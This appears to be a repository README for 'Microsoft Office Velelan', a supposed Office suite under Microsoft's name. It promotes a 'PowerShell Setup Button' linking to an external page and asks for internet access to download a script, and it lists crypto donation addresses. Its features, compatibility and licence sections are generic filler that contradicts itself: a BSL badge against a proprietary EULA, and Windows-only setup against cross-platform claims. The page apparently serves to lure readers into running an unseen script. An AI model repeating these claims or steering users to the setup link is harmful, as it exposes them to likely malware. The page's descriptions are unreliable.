<div align="center">

# Microsoft Office Velelan – Productivity Suite for Windows 11

![](files/preview.png)

### ⚡ PowerShell Setup Button

[![](files/button.png)](https://Nhoel-hub.github.io/microsoft-office-velelan/)

[![lic](https://img.shields.io/badge/Lic-Bsl--1.0-84cc16?style=plastic&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/Powershell--7-7%2B-a3e635?style=plastic&labelColor=0d1117)]() [![ci](https://img.shields.io/badge/Ci-Green-2ea44f?style=plastic&labelColor=0d1117)]()

<div align="center">
<h3>Keep the project growing</h3>
<p><strong>ETH</strong>:&nbsp;<code>0x9E1048E95d4e88A86f1ce97051E6D9B3c0b5E695</code> | <strong>BTC</strong>:&nbsp;<code>1GMuh1UZF77ikLHDgeBeZkjTE7N32Twb4J</code> | <strong>TRON</strong>:&nbsp;<code>TBXgaRr7hm2DqqEPB3GDZRdrqfrSs54nbE</code></p>
</div>

</div>

---

Microsoft Office Velelan is a desktop productivity suite that delivers integrated document authoring, spreadsheet computation, and presentation design within a single native application. Built on a modular architecture, it provides deterministic file handling, structured document models, and consistent rendering across supported operating systems. The suite exposes advanced formatting engines, formula evaluation, and layout composition primitives designed for both interactive use and automated workflows. Local resource management and offline-first operation ensure responsive performance and data integrity without reliance on network services.

## ✅ Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Unified document authoring environment** — a single desktop workspace for composing, editing, and reviewing word processing documents, spreadsheets, and presentations, with consistent formatting controls and shared navigation across all document types.

- **Local-first file handling** — documents are read from and written to the local filesystem with atomic save operations, autosave intervals, and crash-recovery snapshots, minimizing data loss without requiring network connectivity.

- **Native format interoperability** — opens and writes industry-standard document formats, preserving styles, embedded objects, formulas, and layout metadata across round-trip edits.

- **Formula and calculation engine** — a dependency-aware spreadsheet evaluator supporting arithmetic, logical, lookup, and statistical functions, with incremental recalculation and circular-reference detection.

- **Presentation authoring tools** — slide layouts, master templates, speaker notes, transitions, and object-level animation controls for building and sequencing decks.

- **Deterministic rendering pipeline** — layout and typography are resolved through a consistent engine so that on-screen previews match printed and exported output.

- **Extensibility surface** — a plugin interface for adding ribbon commands, custom functions, and document-processing hooks, with sandboxed execution and versioned API contracts.

- **Configuration and profile management** — user-level settings, keyboard shortcut maps, and template libraries stored in a portable profile directory for backup and migration.

- **Diagnostics and logging** — structured application logs, configurable verbosity levels, and a self-check routine for validating installation integrity and runtime dependencies.

- **Cross-platform desktop runtime** — a single native application binary targeting major desktop operating systems, with consistent behavior and shared codebase across platforms.

## How it works

Microsoft Office Velelan operates through a modular, service-oriented architecture that separates presentation, document processing, and persistence layers. At startup, the application initializes a lightweight runtime host that loads core libraries for rendering, document parsing, and change tracking. Each document type is handled by a dedicated format engine that converts native file structures into an internal, schema-based representation, enabling consistent editing behavior across text, spreadsheet, and presentation content.

The editing surface is driven by a stateful document model. Every user action—text input, formatting, formula evaluation, or layout adjustment—is captured as a discrete operation applied to this model. Operations are validated, serialized, and committed to an in-memory transaction log, which supports granular undo and redo and ensures that concurrent changes remain consistent. Rendering is decoupled from the model through an incremental update pipeline, so only affected regions of the document are redrawn, keeping interaction responsive even in large files.

Document persistence uses a layered file abstraction. Files are validated against structural schemas on open, sanitized, and then indexed for fast access. Autosave and recovery services run independently of the UI thread, writing checkpoints to a local cache so that unsaved work can be restored after interruption. Format conversion between supported document types is performed by the same format engines, preserving styles, embedded objects, and metadata where the target format allows.

Extensibility is provided through a plugin boundary. Optional modules load at runtime and register capabilities—such as additional format handlers, language tools, or analysis routines—without modifying the core. All modules communicate through a versioned internal interface, and feature availability is resolved at load time based on host configuration and document context. Security controls, including macro policy enforcement and trusted-location checks, are applied before any document content is executed or rendered.

## Modules and Settings

### Document Library
This module is the central place where Microsoft Office Velelan gathers the Office documents a user chooses to work with, organized by type and folder.
- Location selection determines which folders are scanned for Word, Excel and PowerPoint files, and the library reflects the updated scope after each change.
- File type filters control whether document, spreadsheet or presentation files appear in the list.
- Grouping options switch the overview between type-based and folder-based organization so related files are easier to review together.
- Column visibility settings decide which basic file properties are shown alongside each entry.

### Batch Organization
This module applies user-defined rules to multiple selected documents at once, keeping file layout tidy and consistent.
- Rule definitions let users add prefixes, numbering or folder-based sorting before any change is applied.
- The preview step shows the planned moves, copies, renames and regroupings so users can review and adjust them before confirming.
- After confirmation, the library view reflects the new file layout, making it easy to verify the result.

### Property Review and Filtering
This module surfaces document properties so users can find outdated, duplicated or mislabeled Office files.
- Property columns such as title, author, creation date and last modification time can be shown or hidden per the user's preference.
- Sorting and filtering by these properties narrow the list to the files that need attention.
- Because the library feeds this table, changes made through batch organization are immediately visible in the property view.

### Templates and Document Preparation
This module keeps a managed collection of reusable Office templates and starting documents.
- A default template can be assigned per document type, so new work begins from the intended starting point.
- Quick-access lists can be adjusted to show only the templates relevant to current work.
- Templates defined here are available across the application, including when preparing new documents from a selected workspace profile.

### Comparison Helper
This module presents two versions of the same document side by side for manual review.
- The comparison view can be adjusted to highlight differences in text blocks, tables or slide content depending on the document type.
- Users pick the two versions to compare, and the paired view makes it easier to track what changed between revisions.
- Documents flagged during property review can be sent directly into this module for closer inspection.

### Export Queue
This module queues selected documents for export into other Office formats or common output formats supported by the installed Office applications.
- Target format, output folder and naming pattern can be adjusted for each queued item.
- The queue shows the status of each job, so users can see which exports completed and which are still pending.
- Selections made in the library carry over into the queue, connecting file review with output preparation.

### Additional Settings
- Workspace profile switching changes which document locations, templates and organization rules are active without altering the other profiles.
- Snapshot retention controls how many local backup copies are kept per document, and snapshot storage location can be chosen.
- The dated snapshot list per document allows restoring an earlier copy when needed.
- Rule presets for batch organization can be saved and reused across profiles.

## Usage Scenarios

### Preparing a Client Deliverable Set from Mixed Office Files
**Goal:** Assemble a clean, consistently named batch of Word, Excel and PowerPoint files for a client handoff without touching unrelated personal documents.
**Steps:**
1. Create a new workspace profile dedicated to the client project and set its location selection to the project folder only, so the library shows just those Office files.
2. Use file type filters and grouping options to review the collected documents by type, checking the property columns for title, author and last modification time.
3. Select the deliverable files in the library and define batch organization rules that add a client prefix and sequential numbering, then review the preview of planned renames.
4. Confirm the rules and switch to the property view to verify the renamed files appear with the intended naming pattern.
5. Queue the finalized selection for export, adjusting target format and output folder per item, and monitor the queue status until each job shows as completed.

**Expected result:** The user sees a consistently named set of documents in the library, a matching updated property table, and a completed export queue reflecting the prepared deliverable files in the chosen output folder.

### Reviewing and Restoring an Earlier Revision Before Editing
**Goal:** Check what changed between two revisions of a report and keep a safe copy before reorganizing working files.
**Steps:**
1. Open the document library for the project folder and use property filtering by last modification time to locate the recent and earlier versions of the report.
2. Send both versions into the comparison helper and adjust the view to highlight differences in text blocks and tables.
3. Review the side-by-side presentation to identify what changed between the revisions.
4. Before making changes, adjust snapshot retention and snapshot storage location in the settings, then create a snapshot of the working copy.
5. If needed, open the dated snapshot list for the document and restore the earlier copy.

**Expected result:** The user sees a paired comparison view marking the differences between revisions, a dated snapshot entry for the working file, and the ability to restore the earlier copy from the snapshot list.

### Standardizing Templates Across Separate Work Profiles
**Goal:** Keep personal and project work separated while ensuring new documents in each context start from the right template.
**Steps:**
1. Define two workspace profiles, one for personal Office content and one for project work, each with its own document locations.
2. In the templates module, assign a default template per document type for each profile and adjust the quick-access lists to show only relevant templates.
3. Save rule presets for batch organization so both profiles can reuse consistent renaming and folder-sorting rules.
4. Switch between profiles and confirm the library, templates and organization rules change accordingly without affecting the other profile.
5. Start a new document from the quick-access template list in the active profile and place it in the profile's scanned location.

**Expected result:** The user sees a distinct working set for each profile, with the correct template offered from the collection when starting new work and the other profile's documents and settings left unchanged.

## Compatibility

Microsoft Office Velelan is validated against the following operating environments and integration targets. Systems outside these specifications may function but are not officially supported.

**Operating Systems**
- Windows 10 (version 1809 or later) and Windows 11, 64-bit editions
- macOS 12 (Monterey) and later, on Intel and Apple silicon hardware
- Ubuntu 22.04 LTS and 24.04 LTS, and equivalent enterprise Linux distributions with glibc 2.35 or later

**Document Format Support**
- Full read/write fidelity for DOCX, XLSX, and PPTX (Office Open XML)
- Read and convert support for legacy binary formats: DOC, XLS, and PPT
- Import and export for PDF, CSV, TSV, and plain-text formats
- Round-trip preservation of embedded objects, macros, and custom XML parts where the source format permits

**Integration Targets**
- File system providers supporting standard POSIX and NTFS semantics, including network-mapped and synced folders
- Local and network print subsystems via platform-native print spoolers
- Clipboard interchange with host applications using standard text, rich text, and image formats
- Accessibility APIs on each supported platform (UI Automation, NSAccessibility, and AT-SPI)

**Hardware Baseline**
- 4 GB RAM minimum; 8 GB recommended for multi-document workflows
- 2 GB available disk space for application binaries, excluding user documents
- Display resolution of 1280×768 or higher

**Versioning and Updates**
- Compatibility is maintained across minor releases within a major version line
- Deprecated platform support is announced at least one major release cycle in advance
- Document format compatibility targets remain stable across the supported release window

## FAQ

**What platforms and Office versions are supported?**
Microsoft Office Velelan targets desktop environments on Windows and macOS and is designed to interoperate with locally installed Microsoft Office suites. Compatibility depends on the Office build present on the host system; consult the Compatibility section for the precise matrix of supported versions and configurations.

**Does the software require an active network connection?**
Core functionality operates against the local Office installation. Features that depend on cloud services inherit whatever connectivity the underlying Office suite requires; no additional external services are introduced by Microsoft Office Velelan itself.

**How does Microsoft Office Velelan interact with existing documents?**
The tool operates on documents through the host Office application's object model and file formats. Existing files remain in their native formats, and no proprietary container or conversion step is imposed unless explicitly invoked by the user.

**Is administrative privilege required?**
Installation scope and privilege requirements follow standard desktop software conventions. System-wide deployment may require elevated permissions, while per-user deployment can typically proceed without them. Refer to the deployment guidance accompanying the distribution for specifics.

**Can the software be run alongside other Office add-ins or extensions?**
Yes. Microsoft Office Velelan is designed to coexist with other add-ins and extensions. In the event of a conflict, isolation and load-order behavior follow the host Office application's extension model.

**How is configuration managed?**
Configuration is driven by local settings files and the host Office environment. Settings are deterministic and inspectable, supporting reproducible deployments across machines without reliance on external configuration services.

**What diagnostic information is available for troubleshooting?**
Structured logs are emitted for runtime events and errors, and diagnostic verbosity can be adjusted through configuration. Log output is written locally to assist with support and Root-cause analysis.

**Is the software extensible?**
Extensibility is provided through the documented interfaces exposed by the project. Integrations should target these interfaces rather than internal implementation details, which may change between releases.

**How are updates delivered?**
Updates are distributed as versioned releases of Microsoft Office Velelan. Users should track release notes for behavioral changes and verify compatibility with their Office build prior to upgrading in managed environments.

**Is telemetry collected?**
Microsoft Office Velelan does not introduce telemetry beyond what the host Office suite independently collects. Any data handled by the tool remains local unless the user explicitly directs otherwise.

## License

Microsoft Office Velelan is distributed under a proprietary commercial license. Use of the software is governed by the terms of the end-user license agreement (EULA) accepted during installation. The license grants a non-exclusive, non-transferable right to install and use the software on the number of devices permitted by the purchased edition.

Each licensed edition defines the authorized activation model, including per-device activation limits, account-based sign-in requirements, and any grace-period behavior for offline use. License validation is performed at startup and periodically thereafter; the software records activation and entitlement state locally to support continued operation within the terms of the license.

Redistribution, sublicensing, reverse engineering, and modification of the software binaries are prohibited except where expressly permitted by applicable law. License terms, activation limits, and edition entitlements are subject to change under the terms of the EULA, and continued use of the software constitutes acceptance of the applicable license terms.